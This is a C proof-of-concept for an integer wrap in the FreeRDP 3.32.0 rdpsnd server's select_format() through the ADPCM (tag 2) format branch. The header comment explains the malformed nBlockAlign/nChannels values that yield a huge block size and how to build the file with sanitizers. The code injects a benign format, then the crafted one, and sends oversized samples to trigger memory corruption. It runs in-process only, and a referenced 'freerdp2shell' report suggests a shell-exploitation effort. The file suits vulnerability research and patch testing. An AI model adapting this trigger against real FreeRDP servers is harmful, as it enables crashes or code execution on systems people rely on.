/*
 * PocAdpcmTag2.c — wake-16 variant of PocRdpsndOverflow.c.
 *
 * Same FreeRDP 3.32.0 rdpsnd select_format() wrap as the DVI_ADPCM PoC, but
 * through the WAVE_FORMAT_ADPCM (tag 2) branch: nBlockAlign=8, nChannels=2
 * gives bs = (8 - 7*2)*2/2 + 2 = 0xFFFFFFFFFFFFFFFC. This variant matters
 * because an FFmpeg-enabled build compiled with WITH_DSP_EXPERIMENTAL offers
 * tag 2 in the stock server format list, without a subsystem-supplied table.
 *
 * Build against a 3.32.0 tree with WITH_FFMPEG=ON and
 * -DCMAKE_C_FLAGS=-DWITH_DSP_EXPERIMENTAL (DSP only; see ffmpeg_adpcm_tag2.txt):
 *
 *   gcc -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined \
 *     -I<src>/include -I<src>/winpr/include -I<src>/channels/rdpsnd/server \
 *     -I<build>/include -I<build>/winpr/include \
 *     -L<build>/libfreerdp -L<build>/winpr/libwinpr -L<build>/server/common \
 *     -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl -o PocAdpcmTag2
 *
 * Run with ASAN_OPTIONS=detect_leaks=0:allocator_may_return_null=1:abort_on_error=0
 * and the FFmpeg runtime libraries on LD_LIBRARY_PATH. In-process only; no
 * RDP session, no network. See reports/freerdp2shell-status.md wake-16 section.
 */
#include "rdpsnd_main.h"
#include <freerdp/codec/audio.h>
#include <winpr/synch.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Stage 1 — benign PCM: allocates 8820-byte out_buffer */
static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };

/* Stage 2 — malicious ADPCM tag 2: nBlockAlign=8, nChannels=2.
 * The parse-time floor (>= 8) passes; the codec-consistency relation
 * nBlockAlign >= 7*nChannels is unchecked. */
static AUDIO_FORMAT fmt_adpcm = { WAVE_FORMAT_ADPCM, 2, 44100, 176400, 8, 16, 0, NULL };

static void inject(RdpsndServerContext* ctx, const AUDIO_FORMAT* fmt)
{
	AUDIO_FORMAT* a = calloc(1, sizeof *a);
	*a = *fmt;
	if (fmt->cbSize)
	{
		a->data = malloc(fmt->cbSize);
		memcpy(a->data, fmt->data, fmt->cbSize);
	}
	if (ctx->client_formats)
	{
		free(ctx->client_formats[0].data);
		free(ctx->client_formats);
	}
	ctx->client_formats = a;
	ctx->num_client_formats = 1;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	RdpsndServerContext* ctx = rdpsnd_server_context_new(NULL);
	ctx->src_format = &fmt_pcm;
	ctx->latency = 50;
	InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

	inject(ctx, &fmt_pcm);
	ctx->SelectFormat(ctx, 0);

	inject(ctx, &fmt_adpcm);
	UINT rc = ctx->SelectFormat(ctx, 0);
	printf("SelectFormat rc=%u  out_frames=0x%016zx\n", rc, ctx->priv->out_frames);

	BYTE buf[16384];
	memset(buf, 0x41, sizeof buf);
	ctx->SendSamples(ctx, buf, 4096, 0);
	return 0;
}
